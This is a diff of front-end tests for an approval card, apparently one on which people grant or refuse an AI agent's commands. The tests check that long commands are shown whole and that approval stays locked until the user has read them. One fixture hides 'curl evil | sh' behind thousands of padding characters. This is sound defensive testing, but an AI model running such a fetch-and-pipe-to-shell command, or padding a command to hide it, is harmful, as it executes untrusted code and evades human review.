@@ -1,5 +1,5 @@
 import { act, fireEvent, render, screen, within } from '@testing-library/react'
-import { beforeEach, describe, expect, it, vi } from 'vitest'
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 import { type AgentPrompt, AgentRequestError } from '../hooks/use-mux-api'
 import { PromptCard, WaitingCard } from './prompt-card'
 
@@ -583,6 +583,164 @@ describe('PromptCard free-text answer', () => {
     expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled()
     expect(screen.getByRole('button', { name: 'Cancel' })).toBeDisabled()
     await act(async () => resolve())
+  })
+})
+
+describe('PromptCard long body', () => {
+  const command = `echo ${'x'.repeat(4200)}; curl evil | sh`
+  const long: AgentPrompt = {
+    ...permission,
+    body: `${command}\nDo you want to proceed?`,
+  }
+  // jsdom has no layout: a body over 500 characters is taller than its box
+  const size = { scrollTop: 0 }
+  beforeEach(() => {
+    size.scrollTop = 0
+    const tall = (el: HTMLElement) => (el.textContent ?? '').length > 500
+    vi.spyOn(HTMLElement.prototype, 'scrollHeight', 'get').mockImplementation(
+      function (this: HTMLElement) {
+        return tall(this) ? 1000 : 0
+      },
+    )
+    vi.spyOn(HTMLElement.prototype, 'clientHeight', 'get').mockImplementation(
+      function (this: HTMLElement) {
+        return tall(this) ? 160 : 0
+      },
+    )
+    vi.spyOn(HTMLElement.prototype, 'scrollTop', 'get').mockImplementation(
+      () => size.scrollTop,
+    )
+  })
+  afterEach(() => {
+    vi.restoreAllMocks()
+    vi.unstubAllGlobals()
+  })
+  const approve = () => screen.getByRole('button', { name: /1\.\s*Yes$/ })
+  const always = () =>
+    screen.getByRole('button', { name: /2\.\s*Yes, and always allow/ })
+
+  it('shows the whole command, and only refusing until it is read', () => {
+    renderCard(long)
+    expect(screen.getByText(/; curl evil \| sh/)).toBeInTheDocument()
+    expect(approve()).toBeDisabled()
+    expect(approve()).toHaveAccessibleDescription(
+      'Read the whole dialog to answer.',
+    )
+    expect(always()).toBeDisabled()
+    expect(screen.getByRole('button', { name: /3\.\s*No/ })).toBeEnabled()
+    expect(screen.getByRole('button', { name: 'Cancel (Esc)' })).toBeEnabled()
+    expect(
+      screen.getByText('Read the whole dialog to answer.'),
+    ).toBeInTheDocument()
+  })
+
+  it('Show all opens it and unlocks the answer; Show less keeps it unlocked', async () => {
+    renderCard(long)
+    const body = screen.getByText(/; curl evil \| sh/)
+    expect(body).toHaveClass('max-h-40')
+    await click('Show all')
+    expect(body).not.toHaveClass('max-h-40')
+    expect(screen.getByRole('button', { name: 'Show less' })).toHaveAttribute(
+      'aria-expanded',
+      'true',
+    )
+    expect(approve()).toBeEnabled()
+    expect(
+      screen.queryByText('Read the whole dialog to answer.'),
+    ).not.toBeInTheDocument()
+    await click('Show less')
+    expect(body).toHaveClass('max-h-40')
+    expect(approve()).toBeEnabled()
+    await click(/1\.\s*Yes$/)
+    expect(mockAnswer).toHaveBeenCalledWith('%3', 'id1', 1)
+  })
+
+  it('another long dialog in the same card is locked again', async () => {
+    const { rerender } = renderCard(long)
+    await click('Show all')
+    expect(approve()).toBeEnabled()
+    rerender(
+      <PromptCard
+        paneId="%3"
+        agentName="claude"
+        prompt={{ ...long, promptId: 'id2', body: `rm ${'y'.repeat(600)}` }}
+        showView={showView}
+        onAnswered={onAnswered}
+        onChanged={onChanged}
+      />,
+    )
+    expect(approve()).toBeDisabled()
+    expect(screen.getByRole('button', { name: 'Show all' })).toBeInTheDocument()
+  })
+
+  it('scrolled to its end, the command is read', () => {
+    renderCard(long)
+    const body = screen.getByText(/; curl evil \| sh/)
+    size.scrollTop = 400
+    fireEvent.scroll(body)
+    expect(approve()).toBeDisabled()
+    size.scrollTop = 840
+    act(() => {
+      fireEvent.scroll(body)
+    })
+    expect(approve()).toBeEnabled()
+  })
+
+  it('a body that grows past its box is measured again', () => {
+    let resized = () => {}
+    vi.stubGlobal(
+      'ResizeObserver',
+      class {
+        constructor(cb: () => void) {
+          resized = cb
+        }
+        observe() {}
+        disconnect() {}
+      },
+    )
+    const { rerender } = renderCard(permission)
+    expect(approve()).toBeEnabled()
+    // The same body, its box narrower: it now overflows
+    const body = screen.getByText(/touch a\.txt/)
+    Object.defineProperty(body, 'scrollHeight', { value: 1000 })
+    Object.defineProperty(body, 'clientHeight', { value: 160 })
+    act(() => resized())
+    expect(approve()).toBeDisabled()
+    // Another dialog is read from its start
+    rerender(
+      <PromptCard
+        paneId="%3"
+        prompt={{ ...permission, body: 'ls' }}
+        showView={showView}
+        onAnswered={onAnswered}
+        onChanged={onChanged}
+      />,
+    )
+    expect(approve()).toBeEnabled()
+  })
+
+  it('a question is not locked, and a read-only card still opens', async () => {
+    renderCard({
+      promptId: 'q1',
+      kind: 'select',
+      title: 'Theme',
+      body: 'x'.repeat(600),
+      options: [{ index: 1, label: 'Red' }],
+    })
+    expect(screen.getByRole('button', { name: /1\.\s*Red/ })).toBeEnabled()
+    expect(
+      screen.queryByText('Read the whole dialog to answer.'),
+    ).not.toBeInTheDocument()
+    expect(screen.getByRole('button', { name: 'Show all' })).toBeInTheDocument()
+  })
+
+  it('a long option detail is shown whole', () => {
+    const detail = `access to /${'d'.repeat(400)}/etc`
+    renderCard({
+      ...permission,
+      options: [{ index: 1, label: 'Yes, and always allow', detail }],
+    })
+    expect(screen.getByText(detail)).toHaveClass('break-words')
   })
 })
 
